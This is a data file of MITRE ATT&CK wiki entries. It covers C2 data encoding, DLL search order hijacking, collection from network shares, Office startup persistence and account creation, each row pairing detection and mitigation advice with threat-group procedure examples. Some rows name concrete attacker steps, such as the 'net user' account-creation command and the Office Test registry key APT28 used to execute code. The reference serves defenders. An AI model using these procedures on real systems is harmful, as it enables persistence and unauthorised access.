630,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],"['Itzik Kotler, SafeBreach']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']",['[[Software/S0084|Mis-Type]] uses Base64 encoding for C2 traffic.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Mis-Type,['Command and Control'],['Technique/T1132'],['Data Encoding'],https://attack.mitre.org/wiki/Technique/T1132
631,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],"['Itzik Kotler, SafeBreach']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']",['[[Software/S0085|S-Type]] uses Base64 encoding for C2 traffic.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: S-Type,['Command and Control'],['Technique/T1132'],['Data Encoding'],https://attack.mitre.org/wiki/Technique/T1132
632,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],"['Itzik Kotler, SafeBreach']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']",['[[Software/S0053|SeaDuke]] C2 traffic is base64-encoded.[[CiteRef::Unit 42 SeaDuke 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: SeaDuke, SeaDaddy, SeaDesk",['Command and Control'],['Technique/T1132'],['Data Encoding'],https://attack.mitre.org/wiki/Technique/T1132
633,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],"['Itzik Kotler, SafeBreach']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']",['[[Group/G0040|Patchwork]] used Base64 to encode C2 traffic.[[CiteRef::Cymmetria Patchwork]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Command and Control'],['Technique/T1132'],['Data Encoding'],https://attack.mitre.org/wiki/Technique/T1132
634,"['Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious. Disallow loading of remote DLLs.[[CiteRef::Microsoft DLL Preloading]]']",['Process whitelisting'],['471'],['Stefan Kanthak'],"['File monitoring', 'DLL monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0070|HTTPBrowser]] abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.[[CiteRef::ZScaler Hacking Team]]']",['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],['Use auditing tools capable of detecting DLL search order hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for DLL hijacking weaknesses.[[CiteRef::Powersploit]]\n\nIdentify and block potentially malicious software that may be executed through search order hijacking by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown DLLs.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']","['Ability to add a DLL, manifest file, or .local file, directory, or junction.']","Software: HTTPBrowser, Token Control, HttpDump","['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1038'],['DLL Search Order Hijacking'],https://attack.mitre.org/wiki/Technique/T1038
635,"['Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious. Disallow loading of remote DLLs.[[CiteRef::Microsoft DLL Preloading]]']",['Process whitelisting'],['471'],['Stefan Kanthak'],"['File monitoring', 'DLL monitoring', 'Process command-line parameters', 'Process monitoring']","['Variants of [[Software/S0109|WEBC2]] achieve persistence by using DLL search order hijacking, usually by copying the DLL file to <code>%SYSTEMROOT%</code> (<code>C:\\WINDOWS\\ntshrui.dll</code>).[[CiteRef::Mandiant APT1 Appendix]]']",['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],['Use auditing tools capable of detecting DLL search order hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for DLL hijacking weaknesses.[[CiteRef::Powersploit]]\n\nIdentify and block potentially malicious software that may be executed through search order hijacking by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown DLLs.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']","['Ability to add a DLL, manifest file, or .local file, directory, or junction.']",Software: WEBC2,"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1038'],['DLL Search Order Hijacking'],https://attack.mitre.org/wiki/Technique/T1038
636,"['Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious. Disallow loading of remote DLLs.[[CiteRef::Microsoft DLL Preloading]]']",['Process whitelisting'],['471'],['Stefan Kanthak'],"['File monitoring', 'DLL monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0153|RedLeaves]] is launched through use of DLL search order hijacking to load a malicious dll.[[CiteRef::FireEye APT10 April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Use auditing tools capable of detecting DLL search order hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for DLL hijacking weaknesses.[[CiteRef::Powersploit]]\n\nIdentify and block potentially malicious software that may be executed through search order hijacking by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown DLLs.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']","['Ability to add a DLL, manifest file, or .local file, directory, or junction.']","Software: RedLeaves, BUGJUICE","['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1038'],['DLL Search Order Hijacking'],https://attack.mitre.org/wiki/Technique/T1038
637,"['Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious. Disallow loading of remote DLLs.[[CiteRef::Microsoft DLL Preloading]]']",['Process whitelisting'],['471'],['Stefan Kanthak'],"['File monitoring', 'DLL monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0045|menuPass]] has used DLL search order hijacking.[[CiteRef::PWC Cloud Hopper April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Use auditing tools capable of detecting DLL search order hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for DLL hijacking weaknesses.[[CiteRef::Powersploit]]\n\nIdentify and block potentially malicious software that may be executed through search order hijacking by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown DLLs.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']","['Ability to add a DLL, manifest file, or .local file, directory, or junction.']",[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1038'],['DLL Search Order Hijacking'],https://attack.mitre.org/wiki/Technique/T1038
638,"['Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious. Disallow loading of remote DLLs.[[CiteRef::Microsoft DLL Preloading]]']",['Process whitelisting'],['471'],['Stefan Kanthak'],"['File monitoring', 'DLL monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0070|HTTPBrowser]] abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.[[CiteRef::ZScaler Hacking Team]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Use auditing tools capable of detecting DLL search order hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for DLL hijacking weaknesses.[[CiteRef::Powersploit]]\n\nIdentify and block potentially malicious software that may be executed through search order hijacking by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown DLLs.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']","['Ability to add a DLL, manifest file, or .local file, directory, or junction.']","Software: HTTPBrowser, Token Control, HttpDump","['Defense Evasion', 'Persistence', 'Privilege Escalation']",['Technique/T1038'],['DLL Search Order Hijacking'],https://attack.mitre.org/wiki/Technique/T1038
639,['Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","[""When it first starts, [[Software/S0128|BADNEWS]] crawls the victim's mapped drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.[[CiteRef::Forcepoint Monsoon]]""]",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from a network share, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access network shared drive'],Software: BADNEWS,['Collection'],['Technique/T1039'],['Data from Network Shared Drive'],https://attack.mitre.org/wiki/Technique/T1039
640,['Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0050|CosmicDuke]] steals user files from network shared drives with file extensions and keywords that match a predefined list.[[CiteRef::F-Secure Cosmicduke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from a network share, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access network shared drive'],"Software: CosmicDuke, TinyBaron, ...",['Collection'],['Technique/T1039'],['Data from Network Shared Drive'],https://attack.mitre.org/wiki/Technique/T1039
641,['Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0045|menuPass]] has collected data from remote systems by mounting network shares with <code>net use</code> and using Robocopy to transfer data.[[CiteRef::PWC Cloud Hopper April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from a network share, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access network shared drive'],[],['Collection'],['Technique/T1039'],['Data from Network Shared Drive'],https://attack.mitre.org/wiki/Technique/T1039
642,"['Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Modification to base templated, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.\n\nMonitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins.[[CiteRef::MRWLabs Office Persistence Add-ins]]\n\nNon-standard process execution trees may also indicate suspicious or malicious behavior. Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.']",[],[],"['Ricardo Dias', 'Loic Jaquemet']","['Process monitoring', 'Process command-line parameters', 'Windows Registry', 'File monitoring']",['[[Group/G0007|APT28]] has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key <code>HKCU\\Software\\Microsoft\\Office test\\Special\\Perf</code> to execute code.[[CiteRef::Palo Alto Office Test Sofacy]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Follow Office macro security best practices suitable for your environment. Disable Office VBA macros from executing. Even setting to disable with notification could enable unsuspecting users to execute potentially malicious macros.[[CiteRef::TechNet Office Macro Security]]\n\nFor the Office Test method, create the Registry key used to execute it and set the permissions to ""Read Control"" to prevent easy access to the key without administrator permissions or requiring [[Privilege Escalation]].[[CiteRef::Palo Alto Office Test Sofacy]]\n\nDisable Office add-ins. If they are required, follow best practices for securing them by requiring them to be signed and disabling user notification for allowing add-ins. For some add-ins types (WLL, VBA) additional mitigation is likely required as disabling add-ins in the Office Trust Center does not disable WLL nor does it prevent VBA code from executing.[[CiteRef::MRWLabs Office Persistence Add-ins]]']","['Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['Office Test technique: Office 2007, 2010, 2013, 2015 and 2016\nAdd-ins: some require administrator permissions']",[],['Persistence'],['Technique/T1137'],['Office Application Startup'],https://attack.mitre.org/wiki/Technique/T1137
643,['Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.[[CiteRef::Microsoft User Creation Event]] Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.'],[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']",['The <code>net user username \\password</code> and <code>net user username \\password \\domain</code> commands in [[Software/S0039|Net]] can be used to create a local or domain account respectively.[[CiteRef::Savill 1999]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],['Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]] that may be used to create privileged accounts within an environment.\n\nAdversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['Administrator'],[],"Software: Net, net.exe",['Credential Access'],['Technique/T1136'],['Create Account'],https://attack.mitre.org/wiki/Technique/T1136
644,['Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.[[CiteRef::Microsoft User Creation Event]] Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.'],[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']",['The <code>net user username \\password</code> and <code>net user username \\password \\domain</code> commands in [[Software/S0039|Net]] can be used to create a local or domain account respectively.[[CiteRef::Savill 1999]]'],['Ke3chang'],['Ke3chang'],['G0004'],['Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]] that may be used to create privileged accounts within an environment.\n\nAdversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['Administrator'],[],"Software: Net, net.exe",['Credential Access'],['Technique/T1136'],['Create Account'],https://attack.mitre.org/wiki/Technique/T1136
645,['Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.[[CiteRef::Microsoft User Creation Event]] Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.'],[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']",['The <code>net user username \\password</code> and <code>net user username \\password \\domain</code> commands in [[Software/S0039|Net]] can be used to create a local or domain account respectively.[[CiteRef::Savill 1999]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],['Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]] that may be used to create privileged accounts within an environment.\n\nAdversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['Administrator'],[],"Software: Net, net.exe",['Credential Access'],['Technique/T1136'],['Create Account'],https://attack.mitre.org/wiki/Technique/T1136
646,['Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.[[CiteRef::Microsoft User Creation Event]] Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.'],[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']",['The <code>net user username \\password</code> and <code>net user username \\password \\domain</code> commands in [[Software/S0039|Net]] can be used to create a local or domain account respectively.[[CiteRef::Savill 1999]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],['Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]] that may be used to create privileged accounts within an environment.\n\nAdversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['Administrator'],[],"Software: Net, net.exe",['Credential Access'],['Technique/T1136'],['Create Account'],https://attack.mitre.org/wiki/Technique/T1136
647,['Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.[[CiteRef::Microsoft User Creation Event]] Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.'],[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']",['The <code>net user username \\password</code> and <code>net user username \\password \\domain</code> commands in [[Software/S0039|Net]] can be used to create a local or domain account respectively.[[CiteRef::Savill 1999]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],['Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]] that may be used to create privileged accounts within an environment.\n\nAdversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['Administrator'],[],"Software: Net, net.exe",['Credential Access'],['Technique/T1136'],['Create Account'],https://attack.mitre.org/wiki/Technique/T1136
648,['Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.[[CiteRef::Microsoft User Creation Event]] Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.'],[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']",['The <code>net user username \\password</code> and <code>net user username \\password \\domain</code> commands in [[Software/S0039|Net]] can be used to create a local or domain account respectively.[[CiteRef::Savill 1999]]'],['Naikon'],['Naikon'],['G0019'],['Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]] that may be used to create privileged accounts within an environment.\n\nAdversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['Administrator'],[],"Software: Net, net.exe",['Credential Access'],['Technique/T1136'],['Create Account'],https://attack.mitre.org/wiki/Technique/T1136
